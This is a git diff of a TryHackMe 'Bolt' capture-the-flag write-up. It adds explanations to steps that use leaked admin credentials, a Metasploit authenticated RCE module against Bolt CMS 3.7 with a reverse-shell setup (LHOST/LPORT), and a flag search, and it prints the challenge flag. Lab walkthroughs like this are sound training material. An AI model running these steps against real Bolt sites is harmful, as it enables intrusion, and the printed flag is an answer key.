@@ -188,15 +188,15 @@ DOWNLOADED: 4612 - FOUND: 5
 
 8. `firefox "https://www.google.com/search?client=firefox-b-d&q=boltcms"` to launch firefox and redirect it to Google's search results for "boltcms" to search for their official documentation, which ended up being the first link that popped up for us (**https://docs.boltcms.io**)
   
-![]()
+![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Bolt/Boltcms%20Documentation.png)
 
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Bolt/Boltcms.png)
 
-9. `https://docs.boltcms.io/5.0/manual/login`
+9. `https://docs.boltcms.io/5.0/manual/login` 
 
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Bolt/Boltcms%20User%20Manual.png)
 
-10. `firefox "http://10.10.195.64:8000/bolt"` and sign in using the Jake's set of credentials that he mentioned (bolt:bolt1admin23)
+10. `firefox "http://10.10.195.64:8000/bolt"` to laucnh Firefox and redirect it to the Boltcms login page for our target's web server where we can attempt to sign in using the admin's credentials that he publicly shared, which ended up logging us in to the target's Boltcms manager dashboard for which we can see the version of version of Bolt that they're running on the bottom left 
 
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Bolt/Sign%20in%20to%20Bolt.png)
 
@@ -204,9 +204,9 @@ DOWNLOADED: 4612 - FOUND: 5
 
 # Vulnerability Identification
 > Vulnerability Identification Using Metasploit
-11. `msfconsole`
-12. `search Bolt 3.7`
-13. `info {EXPLOIT PATH}`
+11. `msfconsole` to launch the Metasploit Framework
+12. `search Bolt 3.7` to search for any already existing vulnerability exploits for the Bolt version that they're using, as well as for any other versions before that, which revealed there to be only one vulnerability exploit that allowed for an authenticated RCE
+13. `info {EXPLOIT PATH}` to output more information about the exploit that we just found, such as its CVE, onto our terminal
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ msfconsole 
@@ -557,23 +557,22 @@ THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}
 5. `firefox "http://10.10.195.64:8000"`
 6. `firefox "http://10.10.195.64:8000/entries"`
 7. `firefox "https://www.google.com/search?client=firefox-b-d&q=boltcms"`
-8. `https://docs.boltcms.io/5.0/manual/login`
-9. `firefox "http://10.10.195.64:8000/bolt"`
-10. `msfconsole`
-11. `search Bolt 3.7`
-12. `info {EXPLOIT PATH}`
-13. `use {EXPLOIT PATH}`
-14. `show options`
-15. `set PASSWORD {JAKE'S PASSWORD}`
-16. `set RHOSTS {TARGET IP}`
-17. `set USERNAME {JAKE'S USERNAME}`
-18. `set LHOST {MACHINE IP}`
-19. `set LPORT {PORT NUMBER}`
-20. `show options`
-21. `exploit`
-22. `whoami`
-23. `find / -type f -name flag.txt 2>/dev/null`
-24. `cat {FLAG TEXT PATH}`
+8. `firefox "http://10.10.195.64:8000/bolt"`
+9. `msfconsole`
+10. `search Bolt 3.7`
+11. `info {EXPLOIT PATH}`
+12. `use {EXPLOIT PATH}`
+13. `show options`
+14. `set PASSWORD {JAKE'S PASSWORD}`
+15. `set RHOSTS {TARGET IP}`
+16. `set USERNAME {JAKE'S USERNAME}`
+17. `set LHOST {MACHINE IP}`
+18. `set LPORT {PORT NUMBER}`
+19. `show options`
+20. `exploit`
+21. `whoami`
+22. `find / -type f -name flag.txt 2>/dev/null`
+23. `cat {FLAG TEXT PATH}`
 
 # Dissecting Some Commands
 `nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt`
